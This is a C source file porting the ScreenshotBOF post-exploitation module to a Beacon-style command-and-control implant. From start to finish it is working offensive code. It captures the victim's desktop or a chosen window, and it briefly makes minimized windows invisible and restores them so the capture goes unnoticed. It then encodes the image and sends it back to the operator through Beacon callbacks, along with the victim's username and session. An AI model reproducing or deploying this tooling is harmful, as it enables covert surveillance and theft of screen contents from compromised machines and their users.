/*
 * Beacon Interpreter port of CodeXTF2/ScreenshotBOF entry.cpp.
 * Original source: https://github.com/CodeXTF2/ScreenshotBOF
 *
 * Packed arguments are optional and positional. Omitted trailing values use:
 *   1. str filename      default: screenshot.jpg
 *   2. int save_method   default: 2 (0 = disk, 1 = download, 2 = screenshot)
 *   3. int pid           default: 0 (virtual desktop; otherwise window PID)
 *   4. int grayscale     default: 0 (color; nonzero = grayscale)
 *   5. int quality       default: 85 (valid range: 0..100)
 *   6. int scale         default: 100 (valid range: 1..1000 percent)
 *
 * No packed arguments are required. To override a later value, supply all
 * preceding values because the buffer is positional.
 *
 * Script Editor example rows:
 *   str  screenshot.jpg
 *   int  2
 *   int  0
 *   int  0
 *   int  85
 *   int  100
 *
 * MCP typed-argument example:
 *   [{"type":"str","value":"screenshot.jpg"},
 *    {"type":"int","value":2}, {"type":"int","value":0},
 *    {"type":"int","value":0}, {"type":"int","value":85},
 *    {"type":"int","value":100}]
 *
 * This file targets the default 64-bit Interpreter header selection. For a
 * 32-bit target, define _WIN32 before the includes and validate separately.
 */

#include <windows.h>
#include <beacon.h>
#include <combaseapi.h>
#include <file.h>

#define CALLBACK_SCREENSHOT 3

#define SM_XVIRTUALSCREEN 76
#define SM_YVIRTUALSCREEN 77
#define SM_CXVIRTUALSCREEN 78
#define SM_CYVIRTUALSCREEN 79
#define GW_HWNDNEXT 2

#define GWL_EXSTYLE (-20)
#define WS_EX_TOOLWINDOW 0x00000080
#define WS_EX_LAYERED 0x00080000
#define LWA_ALPHA 0x00000002
#define SW_MINIMIZE 6
#define SW_RESTORE 9
#define SWP_NOSIZE 0x0001
#define SWP_NOMOVE 0x0002
#define SWP_NOZORDER 0x0004
#define SWP_FRAMECHANGED 0x0020

#define SRCCOPY 0x00CC0020
#define HALFTONE 4
#define PW_RENDERFULLCONTENT 0x00000002

#define GDIP_OK 0
#define PIXEL_FORMAT_24BPP_RGB 0x00021808
#define IMAGE_LOCK_MODE_READ 0x0001
#define IMAGE_LOCK_MODE_WRITE 0x0002
#define ENCODER_PARAMETER_VALUE_TYPE_LONG 4

typedef HANDLE HDC;
typedef HANDLE HBITMAP;
typedef HANDLE HGDIOBJ;

typedef struct _POINT_I {
    LONG x;
    LONG y;
} POINT_I;

typedef struct _RECT_I {
    LONG left;
    LONG top;
    LONG right;
    LONG bottom;
} RECT_I;

typedef struct _BITMAP_I {
    LONG bmType;
    LONG bmWidth;
    LONG bmHeight;
    LONG bmWidthBytes;
    WORD bmPlanes;
    WORD bmBitsPixel;
    LPVOID bmBits;
} BITMAP_I;

typedef struct _GDIPLUS_STARTUP_INPUT_I {
    UINT32 GdiplusVersion;
    LPVOID DebugEventCallback;
    BOOL SuppressBackgroundThread;
    BOOL SuppressExternalCodecs;
} GDIPLUS_STARTUP_INPUT_I;

typedef struct _GP_RECT_I {
    INT X;
    INT Y;
    INT Width;
    INT Height;
} GP_RECT_I;

typedef struct _BITMAP_DATA_I {
    UINT Width;
    UINT Height;
    INT Stride;
    INT PixelFormat;
    LPVOID Scan0;
    UINT_PTR Reserved;
} BITMAP_DATA_I;

typedef struct _ENCODER_PARAMETER_I {
    GUID Guid;
    ULONG NumberOfValues;
    ULONG Type;
    LPVOID Value;
} ENCODER_PARAMETER_I;

typedef struct _ENCODER_PARAMETERS_I {
    UINT Count;
    ENCODER_PARAMETER_I Parameter[1];
} ENCODER_PARAMETERS_I;

typedef ULONG (stdcall *PFN_IUNKNOWN_RELEASE)(LPVOID);

USER32$SetProcessDPIAware: stdcall u32 ();
USER32$GetTopWindow: stdcall ptr (ptr);
USER32$GetWindow: stdcall ptr (ptr, u32);
USER32$IsWindowVisible: stdcall u32 (ptr);
USER32$GetWindowThreadProcessId: stdcall u32 (ptr, ptr);
USER32$GetDC: stdcall ptr (ptr);
USER32$ReleaseDC: stdcall i32 (ptr, ptr);
USER32$PrintWindow: stdcall u32 (ptr, ptr, u32);
USER32$GetWindowRect: stdcall u32 (ptr, ptr);
USER32$IsIconic: stdcall u32 (ptr);
USER32$ShowWindow: stdcall u32 (ptr, i32);
USER32$GetWindowLongA: stdcall i32 (ptr, i32);
USER32$SetWindowLongA: stdcall i32 (ptr, i32, i32);
USER32$SetLayeredWindowAttributes: stdcall u32 (ptr, u32, u32, u32);
USER32$UpdateWindow: stdcall u32 (ptr);
USER32$SetWindowPos: stdcall u32 (ptr, ptr, i32, i32, i32, i32, u32);
USER32$GetSystemMetrics: stdcall i32 (i32);

GDI32$CreateCompatibleDC: stdcall ptr (ptr);
GDI32$DeleteDC: stdcall u32 (ptr);
GDI32$CreateCompatibleBitmap: stdcall ptr (ptr, i32, i32);
GDI32$SelectObject: stdcall ptr (ptr, ptr);
GDI32$BitBlt: stdcall u32 (ptr, i32, i32, i32, i32, ptr, i32, i32, u32);
GDI32$StretchBlt: stdcall u32 (ptr, i32, i32, i32, i32, ptr, i32, i32, i32, i32, u32);
GDI32$SetStretchBltMode: stdcall i32 (ptr, i32);
GDI32$DeleteObject: stdcall u32 (ptr);
GDI32$GetObjectA: stdcall i32 (ptr, i32, ptr);

GDIPLUS$GdiplusStartup: stdcall i32 (ptr, ptr, ptr);
GDIPLUS$GdiplusShutdown: stdcall void (size_t);
GDIPLUS$GdipCreateBitmapFromHBITMAP: stdcall i32 (ptr, ptr, ptr);
GDIPLUS$GdipDisposeImage: stdcall i32 (ptr);
GDIPLUS$GdipSaveImageToStream: stdcall i32 (ptr, ptr, ptr, ptr);
GDIPLUS$GdipBitmapLockBits: stdcall i32 (ptr, ptr, u32, i32, ptr);
GDIPLUS$GdipBitmapUnlockBits: stdcall i32 (ptr, ptr);
GDIPLUS$GdipGetImageWidth: stdcall i32 (ptr, ptr);
GDIPLUS$GdipGetImageHeight: stdcall i32 (ptr, ptr);
GDIPLUS$GdipCloneBitmapAreaI: stdcall i32 (i32, i32, i32, i32, i32, ptr, ptr);

void release_com_object(LPVOID object)
{
    LPVOID *vtable;
    PFN_IUNKNOWN_RELEASE release_fn;

    if (object == NULL)
        return;

    vtable = *((LPVOID **)object);
    if (vtable == NULL || vtable[2] == NULL)
        return;

    release_fn = (PFN_IUNKNOWN_RELEASE)vtable[2];
    release_fn(object);
}

void send_screenshot(BYTE *image, int image_length, int session,
    char *title, int title_length, char *username, int username_length)
{
    int message_length;
    int index;
    char *packed;

    if (image == NULL || image_length <= 0 || title == NULL || username == NULL)
        return;

    message_length = 4 + image_length + 4 + 4 + title_length + 4 + username_length;
    packed = (char *)malloc((size_t)message_length);
    if (packed == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "Unable to allocate screenshot callback buffer");
        return;
    }

    packed[0] = (char)(image_length & 0xff);
    packed[1] = (char)((image_length >> 8) & 0xff);
    packed[2] = (char)((image_length >> 16) & 0xff);
    packed[3] = (char)((image_length >> 24) & 0xff);
    memcpy(packed + 4, image, (size_t)image_length);

    index = 4 + image_length;
    packed[index] = (char)(session & 0xff);
    packed[index + 1] = (char)((session >> 8) & 0xff);
    packed[index + 2] = (char)((session >> 16) & 0xff);
    packed[index + 3] = (char)((session >> 24) & 0xff);
    index += 4;

    packed[index] = (char)(title_length & 0xff);
    packed[index + 1] = (char)((title_length >> 8) & 0xff);
    packed[index + 2] = (char)((title_length >> 16) & 0xff);
    packed[index + 3] = (char)((title_length >> 24) & 0xff);
    index += 4;
    memcpy(packed + index, title, (size_t)title_length);
    index += title_length;

    packed[index] = (char)(username_length & 0xff);
    packed[index + 1] = (char)((username_length >> 8) & 0xff);
    packed[index + 2] = (char)((username_length >> 16) & 0xff);
    packed[index + 3] = (char)((username_length >> 24) & 0xff);
    index += 4;
    memcpy(packed + index, username, (size_t)username_length);

    BeaconOutput(CALLBACK_SCREENSHOT, packed, message_length);
    free(packed);
}

HWND find_window_by_pid(DWORD target_pid)
{
    HWND window;
    DWORD window_pid;

    window = GetTopWindow(NULL);
    while (window != NULL) {
        window_pid = 0;
        GetWindowThreadProcessId(window, &window_pid);
        if (window_pid == target_pid && IsWindowVisible(window))
            return window;
        window = GetWindow(window, GW_HWNDNEXT);
    }

    return NULL;
}

HBITMAP capture_window(HWND window, int debug)
{
    RECT_I rect;
    HDC screen_dc;
    HDC memory_dc;
    HBITMAP bitmap;
    HGDIOBJ old_object;
    int width;
    int height;
    int minimized;
    LONG old_style;
    BOOL success;

    screen_dc = NULL;
    memory_dc = NULL;
    bitmap = NULL;
    old_object = NULL;
    success = FALSE;
    minimized = IsIconic(window);
    old_style = 0;

    if (minimized) {
        old_style = GetWindowLongA(window, GWL_EXSTYLE);
        SetWindowLongA(window, GWL_EXSTYLE,
            old_style | WS_EX_LAYERED | WS_EX_TOOLWINDOW);
        SetLayeredWindowAttributes(window, 0, 0, LWA_ALPHA);
        ShowWindow(window, SW_RESTORE);
        UpdateWindow(window);
        Sleep(500);
    }

    if (!GetWindowRect(window, &rect)) {
        BeaconPrintf(CALLBACK_ERROR, "GetWindowRect failed: %lu", GetLastError());
        goto cleanup;
    }

    width = rect.right - rect.left;
    height = rect.bottom - rect.top;
    if (width <= 0 || height <= 0) {
        BeaconPrintf(CALLBACK_ERROR, "Invalid window dimensions: %d x %d", width, height);
        goto cleanup;
    }

    screen_dc = GetDC(NULL);
    if (screen_dc == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "GetDC failed: %lu", GetLastError());
        goto cleanup;
    }

    memory_dc = CreateCompatibleDC(screen_dc);
    if (memory_dc == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "CreateCompatibleDC failed: %lu", GetLastError());
        goto cleanup;
    }

    bitmap = CreateCompatibleBitmap(screen_dc, width, height);
    if (bitmap == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "CreateCompatibleBitmap failed: %lu", GetLastError());
        goto cleanup;
    }

    old_object = SelectObject(memory_dc, bitmap);
    success = PrintWindow(window, memory_dc, PW_RENDERFULLCONTENT);
    if (!success) {
        if (debug)
            BeaconPrintf(CALLBACK_OUTPUT, "PrintWindow failed; falling back to BitBlt");
        success = BitBlt(memory_dc, 0, 0, width, height,
            screen_dc, rect.left, rect.top, SRCCOPY);
    }

cleanup:
    if (old_object != NULL)
        SelectObject(memory_dc, old_object);
    if (memory_dc != NULL)
        DeleteDC(memory_dc);
    if (screen_dc != NULL)
        ReleaseDC(NULL, screen_dc);

    if (minimized) {
        ShowWindow(window, SW_MINIMIZE);
        SetWindowLongA(window, GWL_EXSTYLE, old_style);
        SetWindowPos(window, NULL, 0, 0, 0, 0,
            SWP_NOMOVE | SWP_NOSIZE | SWP_NOZORDER | SWP_FRAMECHANGED);
    }

    if (!success) {
        if (bitmap != NULL)
            DeleteObject(bitmap);
        BeaconPrintf(CALLBACK_ERROR, "Unable to capture window");
        return NULL;
    }

    return bitmap;
}

HBITMAP capture_desktop(void)
{
    int x;
    int y;
    int width;
    int height;
    HDC screen_dc;
    HDC memory_dc;
    HBITMAP bitmap;
    HGDIOBJ old_object;
    BOOL success;

    x = GetSystemMetrics(SM_XVIRTUALSCREEN);
    y = GetSystemMetrics(SM_YVIRTUALSCREEN);
    width = GetSystemMetrics(SM_CXVIRTUALSCREEN);
    height = GetSystemMetrics(SM_CYVIRTUALSCREEN);
    if (width <= 0 || height <= 0) {
        BeaconPrintf(CALLBACK_ERROR, "Invalid virtual desktop dimensions: %d x %d", width, height);
        return NULL;
    }

    screen_dc = GetDC(NULL);
    if (screen_dc == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "GetDC failed: %lu", GetLastError());
        return NULL;
    }

    memory_dc = CreateCompatibleDC(screen_dc);
    if (memory_dc == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "CreateCompatibleDC failed: %lu", GetLastError());
        ReleaseDC(NULL, screen_dc);
        return NULL;
    }

    bitmap = CreateCompatibleBitmap(screen_dc, width, height);
    if (bitmap == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "CreateCompatibleBitmap failed: %lu", GetLastError());
        DeleteDC(memory_dc);
        ReleaseDC(NULL, screen_dc);
        return NULL;
    }

    old_object = SelectObject(memory_dc, bitmap);
    success = BitBlt(memory_dc, 0, 0, width, height,
        screen_dc, x, y, SRCCOPY);
    SelectObject(memory_dc, old_object);
    DeleteDC(memory_dc);
    ReleaseDC(NULL, screen_dc);

    if (!success) {
        BeaconPrintf(CALLBACK_ERROR, "BitBlt failed: %lu", GetLastError());
        DeleteObject(bitmap);
        return NULL;
    }

    return bitmap;
}

HBITMAP scale_bitmap(HBITMAP source, int scale)
{
    BITMAP_I bitmap_info;
    HDC screen_dc;
    HDC source_dc;
    HDC target_dc;
    HBITMAP target;
    HGDIOBJ old_source;
    HGDIOBJ old_target;
    int new_width;
    int new_height;
    BOOL success;

    if (scale == 100)
        return NULL;

    memset(&bitmap_info, 0, sizeof(bitmap_info));
    if (!GetObjectA(source, sizeof(bitmap_info), &bitmap_info))
        return NULL;

    new_width = (bitmap_info.bmWidth * scale) / 100;
    new_height = (bitmap_info.bmHeight * scale) / 100;
    if (new_width <= 0 || new_height <= 0)
        return NULL;

    screen_dc = GetDC(NULL);
    if (screen_dc == NULL)
        return NULL;
    source_dc = CreateCompatibleDC(screen_dc);
    target_dc = CreateCompatibleDC(screen_dc);
    target = CreateCompatibleBitmap(screen_dc, new_width, new_height);
    if (source_dc == NULL || target_dc == NULL || target == NULL) {
        if (source_dc != NULL)
            DeleteDC(source_dc);
        if (target_dc != NULL)
            DeleteDC(target_dc);
        if (target != NULL)
            DeleteObject(target);
        ReleaseDC(NULL, screen_dc);
        return NULL;
    }

    old_source = SelectObject(source_dc, source);
    old_target = SelectObject(target_dc, target);
    SetStretchBltMode(target_dc, HALFTONE);
    success = StretchBlt(target_dc, 0, 0, new_width, new_height,
        source_dc, 0, 0, bitmap_info.bmWidth, bitmap_info.bmHeight, SRCCOPY);
    SelectObject(source_dc, old_source);
    SelectObject(target_dc, old_target);
    DeleteDC(source_dc);
    DeleteDC(target_dc);
    ReleaseDC(NULL, screen_dc);

    if (!success) {
        DeleteObject(target);
        return NULL;
    }

    return target;
}

BOOL bitmap_to_jpeg(HBITMAP bitmap, int quality, int grayscale,
    BYTE **jpeg_data, DWORD *jpeg_size)
{
    GDIPLUS_STARTUP_INPUT_I startup_input;
    ULONG_PTR gdiplus_token;
    LPVOID gp_bitmap;
    LPVOID target_bitmap;
    LPVOID cloned_bitmap;
    LPVOID stream;
    HGLOBAL stream_memory;
    LPVOID locked_memory;
    SIZE_T stream_size;
    UINT width;
    UINT height;
    GP_RECT_I rect;
    BITMAP_DATA_I bitmap_data;
    ENCODER_PARAMETERS_I encoder_parameters;
    GUID quality_guid;
    GUID jpeg_clsid;
    ULONG quality_value;
    BYTE *scan;
    BYTE *row;
    BYTE *pixel;
    BYTE red;
    BYTE green;
    BYTE blue;
    BYTE gray;
    UINT px;
    UINT py;
    int status;

    *jpeg_data = NULL;
    *jpeg_size = 0;
    gdiplus_token = 0;
    gp_bitmap = NULL;
    target_bitmap = NULL;
    cloned_bitmap = NULL;
    stream = NULL;
    stream_memory = NULL;
    locked_memory = NULL;

    if (LoadLibraryA("gdiplus.dll") == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "Unable to load gdiplus.dll");
        return FALSE;
    }

    memset(&startup_input, 0, sizeof(startup_input));
    startup_input.GdiplusVersion = 1;
    status = GdiplusStartup(&gdiplus_token, &startup_input, NULL);
    if (status != GDIP_OK) {
        BeaconPrintf(CALLBACK_ERROR, "GdiplusStartup failed: %d", status);
        return FALSE;
    }

    status = GdipCreateBitmapFromHBITMAP(bitmap, NULL, &gp_bitmap);
    if (status != GDIP_OK || gp_bitmap == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "GdipCreateBitmapFromHBITMAP failed: %d", status);
        goto failure;
    }
    target_bitmap = gp_bitmap;

    if (grayscale) {
        width = 0;
        height = 0;
        if (GdipGetImageWidth(gp_bitmap, &width) == GDIP_OK &&
            GdipGetImageHeight(gp_bitmap, &height) == GDIP_OK &&
            width > 0 && height > 0) {
            status = GdipCloneBitmapAreaI(0, 0, (INT)width, (INT)height,
                PIXEL_FORMAT_24BPP_RGB, gp_bitmap, &cloned_bitmap);
            if (status == GDIP_OK && cloned_bitmap != NULL)
                target_bitmap = cloned_bitmap;

            rect.X = 0;
            rect.Y = 0;
            rect.Width = (INT)width;
            rect.Height = (INT)height;
            memset(&bitmap_data, 0, sizeof(bitmap_data));
            status = GdipBitmapLockBits(target_bitmap, &rect,
                IMAGE_LOCK_MODE_READ | IMAGE_LOCK_MODE_WRITE,
                PIXEL_FORMAT_24BPP_RGB, &bitmap_data);
            if (status == GDIP_OK) {
                scan = (BYTE *)bitmap_data.Scan0;
                for (py = 0; py < height; py++) {
                    row = scan + ((INT)py * bitmap_data.Stride);
                    for (px = 0; px < width; px++) {
                        pixel = row + (px * 3);
                        blue = pixel[0];
                        green = pixel[1];
                        red = pixel[2];
                        gray = (BYTE)((red * 77 + green * 150 + blue * 29) >> 8);
                        pixel[0] = gray;
                        pixel[1] = gray;
                        pixel[2] = gray;
                    }
                }
                GdipBitmapUnlockBits(target_bitmap, &bitmap_data);
            }
            else {
                BeaconPrintf(CALLBACK_ERROR, "GdipBitmapLockBits failed: %d", status);
            }
        }
    }

    if (CreateStreamOnHGlobal(NULL, TRUE, &stream) != 0 || stream == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "CreateStreamOnHGlobal failed");
        goto failure;
    }

    quality_guid.Data1 = 0x1d5be4b5;
    quality_guid.Data2 = 0xfa4a;
    quality_guid.Data3 = 0x452d;
    quality_guid.Data4[0] = 0x9c;
    quality_guid.Data4[1] = 0xdd;
    quality_guid.Data4[2] = 0x5d;
    quality_guid.Data4[3] = 0xb3;
    quality_guid.Data4[4] = 0x51;
    quality_guid.Data4[5] = 0x05;
    quality_guid.Data4[6] = 0xe7;
    quality_guid.Data4[7] = 0xeb;

    jpeg_clsid.Data1 = 0x557cf401;
    jpeg_clsid.Data2 = 0x1a04;
    jpeg_clsid.Data3 = 0x11d3;
    jpeg_clsid.Data4[0] = 0x9a;
    jpeg_clsid.Data4[1] = 0x73;
    jpeg_clsid.Data4[2] = 0x00;
    jpeg_clsid.Data4[3] = 0x00;
    jpeg_clsid.Data4[4] = 0xf8;
    jpeg_clsid.Data4[5] = 0x1e;
    jpeg_clsid.Data4[6] = 0xf3;
    jpeg_clsid.Data4[7] = 0x2e;

    quality_value = (ULONG)quality;
    memset(&encoder_parameters, 0, sizeof(encoder_parameters));
    encoder_parameters.Count = 1;
    encoder_parameters.Parameter[0].Guid = quality_guid;
    encoder_parameters.Parameter[0].NumberOfValues = 1;
    encoder_parameters.Parameter[0].Type = ENCODER_PARAMETER_VALUE_TYPE_LONG;
    encoder_parameters.Parameter[0].Value = &quality_value;

    status = GdipSaveImageToStream(target_bitmap, stream,
        &jpeg_clsid, &encoder_parameters);
    if (status != GDIP_OK) {
        BeaconPrintf(CALLBACK_ERROR, "GdipSaveImageToStream failed: %d", status);
        goto failure;
    }

    if (GetHGlobalFromStream(stream, &stream_memory) != 0 || stream_memory == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "GetHGlobalFromStream failed");
        goto failure;
    }

    stream_size = GlobalSize(stream_memory);
    if (stream_size == 0 || stream_size > 0x7fffffff) {
        BeaconPrintf(CALLBACK_ERROR, "Invalid JPEG size: %llu",
            (unsigned long long)stream_size);
        goto failure;
    }

    locked_memory = GlobalLock(stream_memory);
    if (locked_memory == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "GlobalLock failed: %lu", GetLastError());
        goto failure;
    }

    *jpeg_data = (BYTE *)malloc(stream_size);
    if (*jpeg_data == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "Unable to allocate JPEG buffer");
        goto failure;
    }
    memcpy(*jpeg_data, locked_memory, stream_size);
    *jpeg_size = (DWORD)stream_size;
    GlobalUnlock(stream_memory);
    locked_memory = NULL;

    release_com_object(stream);
    stream = NULL;
    if (cloned_bitmap != NULL)
        GdipDisposeImage(cloned_bitmap);
    if (gp_bitmap != NULL)
        GdipDisposeImage(gp_bitmap);
    GdiplusShutdown(gdiplus_token);
    return TRUE;

failure:
    if (locked_memory != NULL)
        GlobalUnlock(stream_memory);
    if (*jpeg_data != NULL) {
        free(*jpeg_data);
        *jpeg_data = NULL;
    }
    *jpeg_size = 0;
    if (stream != NULL)
        release_com_object(stream);
    if (cloned_bitmap != NULL)
        GdipDisposeImage(cloned_bitmap);
    if (gp_bitmap != NULL)
        GdipDisposeImage(gp_bitmap);
    if (gdiplus_token != 0)
        GdiplusShutdown(gdiplus_token);
    return FALSE;
}

BOOL save_jpeg(char *filename, int save_method, BYTE *jpeg_data, DWORD jpeg_size)
{
    HANDLE file;
    DWORD bytes_written;
    DWORD session;
    char username[256];
    char title[32];
    DWORD username_length;
    int title_length;

    if (save_method == 0) {
        file = CreateFileA(filename, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
            FILE_ATTRIBUTE_NORMAL | FILE_FLAG_SEQUENTIAL_SCAN, NULL);
        if (file == INVALID_HANDLE_VALUE) {
            BeaconPrintf(CALLBACK_ERROR, "CreateFileA failed: %lu", GetLastError());
            return FALSE;
        }
        bytes_written = 0;
        if (!WriteFile(file, jpeg_data, jpeg_size, &bytes_written, NULL) ||
            bytes_written != jpeg_size) {
            BeaconPrintf(CALLBACK_ERROR, "WriteFile failed: %lu", GetLastError());
            CloseHandle(file);
            return FALSE;
        }
        CloseHandle(file);
        BeaconPrintf(CALLBACK_OUTPUT, "Saved JPEG to %s", filename);
        return TRUE;
    }

    if (save_method == 1) {
        if (!BeaconDownload(filename, (char *)jpeg_data, jpeg_size)) {
            BeaconPrintf(CALLBACK_ERROR, "BeaconDownload failed for %s", filename);
            return FALSE;
        }
        BeaconPrintf(CALLBACK_OUTPUT, "Downloaded JPEG as %s", filename);
        return TRUE;
    }

    if (save_method == 2) {
        session = (DWORD)-1;
        ProcessIdToSessionId(GetCurrentProcessId(), &session);
        memset(username, 0, sizeof(username));
        username_length = GetEnvironmentVariableA("USERNAME", username, sizeof(username));
        if (username_length == 0 || username_length >= sizeof(username)) {
            memcpy(username, "unknown", 8);
            username_length = 7;
        }
        memcpy(title, "Screenshot", 11);
        title_length = 10;
        send_screenshot(jpeg_data, (int)jpeg_size, (int)session,
            title, title_length, username, (int)username_length);
        BeaconPrintf(CALLBACK_OUTPUT, "Returned JPEG through the screenshot callback");
        return TRUE;
    }

    BeaconPrintf(CALLBACK_ERROR, "Unknown save method: %d", save_method);
    return FALSE;
}

void run_screenshot(char *filename, int save_method, int pid,
    int grayscale, int quality, int scale, int debug)
{
    HWND window;
    HBITMAP captured;
    HBITMAP scaled;
    HBITMAP work_bitmap;
    BYTE *jpeg_data;
    DWORD jpeg_size;

    if (quality < 0)
        quality = 0;
    if (quality > 100)
        quality = 100;
    if (scale < 1)
        scale = 100;
    if (scale > 1000)
        scale = 1000;
    if (save_method < 0 || save_method > 2) {
        BeaconPrintf(CALLBACK_ERROR, "save_method must be 0, 1, or 2");
        return;
    }

    SetProcessDPIAware();
    captured = NULL;
    scaled = NULL;
    work_bitmap = NULL;
    jpeg_data = NULL;
    jpeg_size = 0;

    if (pid != 0) {
        window = find_window_by_pid((DWORD)pid);
        if (window == NULL) {
            BeaconPrintf(CALLBACK_ERROR, "No visible window found for PID %d", pid);
            return;
        }
        if (debug)
            BeaconPrintf(CALLBACK_OUTPUT, "Capturing window %p for PID %d", window, pid);
        captured = capture_window(window, debug);
    }
    else {
        if (debug)
            BeaconPrintf(CALLBACK_OUTPUT, "Capturing the virtual desktop");
        captured = capture_desktop();
    }

    if (captured == NULL)
        return;

    if (scale != 100) {
        scaled = scale_bitmap(captured, scale);
        if (scaled == NULL) {
            BeaconPrintf(CALLBACK_ERROR,
                "Scaling to %d%% failed; encoding the original bitmap", scale);
        }
    }

    work_bitmap = scaled != NULL ? scaled : captured;
    if (!bitmap_to_jpeg(work_bitmap, quality, grayscale, &jpeg_data, &jpeg_size)) {
        if (scaled != NULL)
            DeleteObject(scaled);
        DeleteObject(captured);
        return;
    }

    save_jpeg(filename, save_method, jpeg_data, jpeg_size);
    free(jpeg_data);
    if (scaled != NULL)
        DeleteObject(scaled);
    DeleteObject(captured);
}

/* Interpreter entry logic: __argc is the packed buffer length, not argc. */
datap args;
char *filename;
char *provided_filename;
int save_method;
int pid;
int grayscale;
int quality;
int scale;

filename = "screenshot.jpg";
provided_filename = NULL;
save_method = 2;
pid = 0;
grayscale = 0;
quality = 85;
scale = 100;

if (__argc > 0) {
    memset(&args, 0, sizeof(args));
    BeaconDataParse(&args, __argv, __argc);

    if (BeaconDataLength(&args) > 0) {
        provided_filename = BeaconDataExtract(&args, NULL);
        if (provided_filename != NULL && provided_filename[0] != 0)
            filename = provided_filename;
    }
    if (BeaconDataLength(&args) >= 4)
        save_method = BeaconDataInt(&args);
    if (BeaconDataLength(&args) >= 4)
        pid = BeaconDataInt(&args);
    if (BeaconDataLength(&args) >= 4)
        grayscale = BeaconDataInt(&args);
    if (BeaconDataLength(&args) >= 4)
        quality = BeaconDataInt(&args);
    if (BeaconDataLength(&args) >= 4)
        scale = BeaconDataInt(&args);
}

run_screenshot(filename, save_method, pid, grayscale, quality, scale, 0);
